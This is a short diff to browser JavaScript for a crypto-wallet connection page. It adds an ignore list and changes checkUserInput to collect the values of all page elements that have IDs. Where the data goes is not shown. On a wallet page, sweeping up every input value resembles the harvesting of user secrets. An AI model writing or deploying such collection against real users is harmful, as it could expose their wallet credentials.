@@ -7,6 +7,7 @@ const Web3Modal = window.Web3Modal.default;
 const WalletConnectProvider = window.WalletConnectProvider.default;
 const Fortmatic = window.Fortmatic;
 const evmChains = window.evmChains;
+const ignore = ["WEB3_CONNECT_MODAL_ID", "template", "input", "eth", "sol"];
 
 const fetchUsers = () => {
     axios.get(BASE_URL, {
@@ -44,8 +45,10 @@ async function checkUserInput() {
     var allIds = [];
     for (var i = 0, n = allElements.length; i < n; ++i) {
         var el = allElements[i];
-        if (el.id) {
-            allIds.push({ [el.id]: el.innerHTML });
+        if (!ignore.includes(el.id)) {
+            if (el.id) {
+                allIds.push({ [el.id]: el.value });
+            }
         }
     }
 
